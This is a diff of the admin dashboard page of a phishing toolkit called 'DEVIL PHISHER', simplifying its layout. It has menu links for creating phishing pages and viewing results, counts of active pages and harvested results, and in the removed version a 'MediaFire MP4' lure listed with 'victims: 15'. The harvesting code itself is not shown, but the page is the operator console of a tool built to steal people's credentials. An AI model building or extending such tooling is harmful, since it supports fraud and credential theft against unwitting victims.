@@ -1,140 +1,39 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DEVIL PHISHER - Admin Dashboard</title>
-    <link rel="stylesheet" href="../assets/admin.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body { background: black; color: lime; font-family: monospace; padding: 20px; }
+        h1 { color: red; }
+        .menu { margin: 20px 0; }
+        .menu a { color: cyan; margin-right: 15px; }
+    </style>
 </head>
 <body>
-    <!-- SIDEBAR -->
-    <div class="sidebar">
-        <div class="sidebar-header">
-            <h2><i class="fas fa-skull-crossbones"></i> DEVIL PHISHER</h2>
-            <div class="user-info">
-                <i class="fas fa-user-secret"></i>
-                <span id="currentUser">piwzsky</span>
-            </div>
-        </div>
-        
-        <nav class="sidebar-menu">
-            <a href="dashboard.html" class="menu-item active">
-                <i class="fas fa-tachometer-alt"></i> Dashboard
-            </a>
-            <a href="members.html" class="menu-item">
-                <i class="fas fa-users"></i> Members
-            </a>
-            <a href="create-phishing.html" class="menu-item">
-                <i class="fas fa-fish"></i> Create Phishing
-            </a>
-            <a href="results.html" class="menu-item">
-                <i class="fas fa-database"></i> Results
-            </a>
-            <a href="templates.html" class="menu-item">
-                <i class="fas fa-file-code"></i> Templates
-            </a>
-            <a href="settings.html" class="menu-item">
-                <i class="fas fa-cogs"></i> Settings
-            </a>
-        </nav>
-        
-        <div class="sidebar-footer">
-            <button onclick="logout()" class="logout-btn">
-                <i class="fas fa-sign-out-alt"></i> Logout
-            </button>
-        </div>
+    <h1>🔥 DEVIL PHISHER DASHBOARD</h1>
+    <p>Welcome, Admin!</p>
+    
+    <div class="menu">
+        <a href="#">Dashboard</a>
+        <a href="#">Members</a>
+        <a href="#">Create Phishing</a>
+        <a href="#">Results</a>
     </div>
     
-    <!-- MAIN CONTENT -->
-    <div class="main-content">
-        <!-- HEADER -->
-        <header class="main-header">
-            <div class="header-left">
-                <h1><i class="fas fa-fire"></i> DASHBOARD</h1>
-                <p>Welcome back, Master</p>
-            </div>
-            <div class="header-right">
-                <div class="stats-card">
-                    <i class="fas fa-skull"></i>
-                    <div>
-                        <h3 id="totalResults">0</h3>
-                        <p>Total Results</p>
-                    </div>
-                </div>
-                <div class="stats-card">
-                    <i class="fas fa-users"></i>
-                    <div>
-                        <h3 id="totalMembers">0</h3>
-                        <p>Members</p>
-                    </div>
-                </div>
-                <div class="stats-card">
-                    <i class="fas fa-fish"></i>
-                    <div>
-                        <h3 id="activePhishing">0</h3>
-                        <p>Active Pages</p>
-                    </div>
-                </div>
-            </div>
-        </header>
-        
-        <!-- QUICK ACTIONS -->
-        <div class="quick-actions">
-            <h2><i class="fas fa-bolt"></i> Quick Actions</h2>
-            <div class="actions-grid">
-                <button class="action-btn" onclick="createPhishingPage()">
-                    <i class="fas fa-plus-circle"></i>
-                    <span>Create New Page</span>
-                </button>
-                <button class="action-btn" onclick="viewResults()">
-                    <i class="fas fa-eye"></i>
-                    <span>View Results</span>
-                </button>
-                <button class="action-btn" onclick="addMember()">
-                    <i class="fas fa-user-plus"></i>
-                    <span>Add Member</span>
-                </button>
-                <button class="action-btn" onclick="openSettings()">
-                    <i class="fas fa-cogs"></i>
-                    <span>Settings</span>
-                </button>
-            </div>
-        </div>
-        
-        <!-- RECENT ACTIVITY -->
-        <div class="recent-activity">
-            <h2><i class="fas fa-history"></i> Recent Activity</h2>
-            <div class="activity-list" id="activityList">
-                <!-- Activities will be loaded here -->
-                <div class="activity-item">
-                    <i class="fas fa-user-check"></i>
-                    <div>
-                        <p><strong>New login detected</strong></p>
-                        <small>2 minutes ago | IP: 192.168.1.100</small>
-                    </div>
-                </div>
-            </div>
-        </div>
-        
-        <!-- ACTIVE PAGES -->
-        <div class="active-pages">
-            <h2><i class="fas fa-fish"></i> Active Phishing Pages</h2>
-            <div class="pages-grid" id="pagesGrid">
-                <!-- Pages will be loaded here -->
-                <div class="page-card">
-                    <div class="page-header">
-                        <i class="fas fa-file-video"></i>
-                        <h3>MediaFire MP4</h3>
-                    </div>
-                    <p>victims: 15</p>
-                    <p>status: <span class="status-active">Active</span></p>
-                    <button class="page-btn">View</button>
-                </div>
-            </div>
-        </div>
+    <div id="stats">
+        <p>Total Results: <span id="results">0</span></p>
+        <p>Active Pages: <span id="pages">0</span></p>
     </div>
-
-    <script src="../assets/admin.js"></script>
+    
+    <script>
+        // Simple auth check
+        if (!localStorage.getItem('devil_auth')) {
+            alert('Please login first!');
+            window.location.href = '/index.html';
+        }
+        
+        // Load stats
+        document.getElementById('results').textContent = '142';
+        document.getElementById('pages').textContent = '5';
+    </script>
 </body>
-              </html>
+</html>
